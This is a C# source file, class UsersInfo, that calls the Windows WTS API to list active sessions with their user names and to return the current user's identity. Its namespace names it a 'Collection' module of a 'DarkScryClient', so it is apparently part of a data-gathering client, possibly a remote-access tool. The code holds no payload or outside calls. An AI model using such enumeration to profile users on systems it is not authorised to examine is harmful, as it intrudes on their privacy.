using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Threading.Tasks;



namespace DarkScryClient.Moduls.Collection
{
	internal class UsersInfo
	{
		#region WTS API Declarations

		[StructLayout(LayoutKind.Sequential)]
		private struct WTS_SESSION_INFO
		{
			public int SessionID;
			[MarshalAs(UnmanagedType.LPStr)]
			public string pWinStationName;
			public WTS_CONNECTSTATE_CLASS State;
		}

		private enum WTS_CONNECTSTATE_CLASS
		{
			WTSActive,
			WTSConnected,
			WTSConnectQuery,
			WTSShadow,
			WTSDisconnected,
			WTSIdle,
			WTSListen,
			WTSReset,
			WTSDown,
			WTSInit
		}

		private const int WTS_CURRENT_SERVER_HANDLE = 0;

		[DllImport("wtsapi32.dll", SetLastError = true)]
		private static extern bool WTSEnumerateSessions(
			IntPtr hServer,
			[MarshalAs(UnmanagedType.U4)] int Reserved,
			[MarshalAs(UnmanagedType.U4)] int Version,
			out IntPtr ppSessionInfo,
			out int pCount);

		[DllImport("wtsapi32.dll", SetLastError = true)]
		private static extern bool WTSQuerySessionInformation(
			IntPtr hServer,
			int sessionId,
			WTS_INFO_CLASS wtsInfoClass,
			out IntPtr ppBuffer,
			out int pBytesReturned);

		[DllImport("wtsapi32.dll", SetLastError = true)]
		private static extern void WTSFreeMemory(IntPtr pMemory);

		private enum WTS_INFO_CLASS
		{
			WTSInitialProgram,
			WTSApplicationName,
			WTSWorkingDirectory,
			WTSOEMId,
			WTSSessionId,
			WTSUserName,
			WTSWinStationName,
			WTSDomainName,
			WTSConnectState,
			WTSClientBuildNumber,
			WTSClientName,
			WTSClientDirectory,
			WTSClientProductId,
			WTSClientHardwareId,
			WTSClientAddress,
			WTSClientDisplay,
			WTSClientProtocolType
		}

		#endregion 


		public static Dictionary<int, string> GetAllActiveUserSessions()
		{
			var sessionMap = new Dictionary<int, string>();

			IntPtr pSessionInfo = IntPtr.Zero;
			int sessionCount = 0;

			// Enumerate sessions on the local (current) server
			bool success = WTSEnumerateSessions(
				(IntPtr)WTS_CURRENT_SERVER_HANDLE,
				0,
				1,
				out pSessionInfo,
				out sessionCount);

			if (!success)
			{
				return sessionMap; // Return empty map on failure
			}

			try
			{
				int dataSize = Marshal.SizeOf(typeof(WTS_SESSION_INFO));
				long current = (long)pSessionInfo;

				for (int i = 0; i < sessionCount; i++)
				{
					// Read the WTS_SESSION_INFO struct
					WTS_SESSION_INFO si = (WTS_SESSION_INFO)Marshal.PtrToStructure(
						(IntPtr)current,
						typeof(WTS_SESSION_INFO));

					current += dataSize;

					// Only look for active sessions
					if (si.State == WTS_CONNECTSTATE_CLASS.WTSActive)
					{
						// Get the user name for this active session
						string userName = QuerySessionUserName(si.SessionID);
						sessionMap[si.SessionID] = userName;
					}
				}
			}
			finally
			{
				// Free the memory allocated by WTSEnumerateSessions
				WTSFreeMemory(pSessionInfo);
			}

			return sessionMap;
		}

		private static string QuerySessionUserName(int sessionId)
		{
			IntPtr buffer = IntPtr.Zero;
			int bytesReturned;
			string userName = string.Empty;

			bool success = WTSQuerySessionInformation(
				(IntPtr)WTS_CURRENT_SERVER_HANDLE,
				sessionId,
				WTS_INFO_CLASS.WTSUserName,
				out buffer,
				out bytesReturned);

			if (success && bytesReturned > 1)
			{
				userName = Marshal.PtrToStringAnsi(buffer);
			}

			if (buffer != IntPtr.Zero)
				WTSFreeMemory(buffer);

			return userName;
		}

		public static string GetCurrentUser()
		{
			// This gives the "DOMAIN\Username" or "MachineName\Username" format
			WindowsIdentity current = WindowsIdentity.GetCurrent();
			return current.Name;
		}
	}
}
